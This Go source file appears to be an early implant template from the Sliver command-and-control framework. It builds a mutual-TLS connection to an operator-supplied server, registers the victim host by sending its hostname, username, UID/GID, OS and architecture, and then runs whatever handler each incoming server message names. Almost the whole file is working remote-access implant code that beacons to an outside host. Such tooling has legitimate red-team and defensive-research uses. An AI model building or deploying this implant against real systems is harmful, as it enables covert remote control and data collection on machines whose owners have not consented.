package main

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"os"
	"os/user"
	"runtime"
	"time"

	pb "sliver/protobuf"

	"github.com/golang/protobuf/proto"
)

const (
	sliverName = `{{.Name}}`
	keyPEM     = `{{.Key}}`
	certPEM    = `{{.Cert}}`
	caCertPEM  = `{{.CACert}}`

	defaultServerIP    = `{{.DefaultServer}}`
	defaultServerLport = 8444

	timeout        = 30 * time.Second
	readBufSize    = 256 * 1024 // 64kb
	zeroReadsLimit = 10
)

var (
	server *string
	lport  *int
)

func main() {

	log.SetFlags(log.LstdFlags | log.Lshortfile)

	server = flag.String("server", defaultServerIP, "server address")
	lport = flag.Int("lport", defaultServerLport, "server listen port")
	flag.Parse()

	log.Printf("Hello my name is %s", sliverName)
	log.Printf("Connecting -> %s:%d", *server, uint16(*lport))
	conn := tlsConnect(*server, uint16(*lport))
	defer conn.Close()
	registerSliver(conn)

	handlers := getSystemHandlers()
	for {
		envelope, err := socketReadEnvelope(conn)
		if err != nil {
			continue
		}
		handler := handlers[envelope.Type]
		go handler.(func([]byte))(envelope.Data)
	}
}

func registerSliver(conn *tls.Conn) {
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	data, _ := proto.Marshal(&pb.RegisterSliver{
		Name:     sliverName,
		Hostname: hostname,
		Username: currentUser.Username,
		Uid:      currentUser.Uid,
		Gid:      currentUser.Gid,
		Os:       runtime.GOOS,
		Arch:     runtime.GOARCH,
	})
	envelope := pb.Envelope{
		Type: "register",
		Data: data,
	}
	socketWriteEnvelope(conn, envelope)
}

// socketWriteEnvelope - Writes a message to the TLS socket using length prefix framing
// which is a fancy way of saying we write the length of the message then the message
// e.g. [uint32 length|message] so the reciever can delimit messages properly
func socketWriteEnvelope(connection *tls.Conn, envelope pb.Envelope) error {
	data, err := proto.Marshal(&envelope)
	if err != nil {
		log.Print("Envelope marshaling error: ", err)
		return err
	}
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	connection.Write(dataLengthBuf.Bytes())
	connection.Write(data)
	return nil
}

// socketReadEnvelope - Reads a message from the TLS connection using length prefix framing
func socketReadEnvelope(connection *tls.Conn) (pb.Envelope, error) {
	dataLengthBuf := make([]byte, 4) // Size of uint32
	_, err := connection.Read(dataLengthBuf)
	if err != nil {
		log.Printf("Socket error (read msg-length): %v\n", err)
		return pb.Envelope{}, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))

	// Read the length of the data
	readBuf := make([]byte, readBufSize)
	dataBuf := make([]byte, 0)
	totalRead := 0
	for {
		n, err := connection.Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			log.Printf("Read error: %s\n", err)
			break
		}
	}

	// Unmarshal the protobuf envelope
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		log.Printf("Unmarshaling envelope error: %v", err)
		return pb.Envelope{}, err
	}

	return *envelope, nil
}

// tlsConnect - Get a TLS connection or die trying
func tlsConnect(address string, port uint16) *tls.Conn {
	tlsConfig := getTLSConfig()
	connection, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", address, port), tlsConfig)
	if err != nil {
		log.Printf("Unable to connect: %v", err)
		os.Exit(4)
	}
	return connection
}

func getTLSConfig() *tls.Config {

	// Load pivot certs
	certPEM, err := tls.X509KeyPair([]byte(certPEM), []byte(keyPEM))
	if err != nil {
		log.Printf("Cannot load pivot certificate: %v", err)
		os.Exit(5)
	}

	// Load CA cert
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM([]byte(caCertPEM))

	// Setup config with custom certificate validation routine
	tlsConfig := &tls.Config{
		Certificates:          []tls.Certificate{certPEM},
		RootCAs:               caCertPool,
		InsecureSkipVerify:    true, // Don't worry I sorta know what I'm doing
		VerifyPeerCertificate: rootOnlyVerifyCertificate,
	}
	tlsConfig.BuildNameToCertificate()

	return tlsConfig
}

// rootOnlyVerifyCertificate - Go doesn't provide a method for only skipping hostname validation so
// we have to disable all of the fucking certificate validation and re-implement everything.
// https://github.com/golang/go/issues/21971
func rootOnlyVerifyCertificate(rawCerts [][]byte, _ [][]*x509.Certificate) error {

	roots := x509.NewCertPool()
	ok := roots.AppendCertsFromPEM([]byte(caCertPEM))
	if !ok {
		log.Printf("Failed to parse root certificate")
		os.Exit(3)
	}

	cert, err := x509.ParseCertificate(rawCerts[0]) // We should only get one cert
	if err != nil {
		log.Printf("Failed to parse certificate: " + err.Error())
		return err
	}

	// Basically we only care if the certificate was signed by our authority
	// Go selects sensible defaults for time and EKU, basically we're only
	// skipping the hostname check, I think?
	options := x509.VerifyOptions{
		Roots: roots,
	}
	if _, err := cert.Verify(options); err != nil {
		log.Printf("Failed to verify certificate: " + err.Error())
		return err
	}

	return nil
}
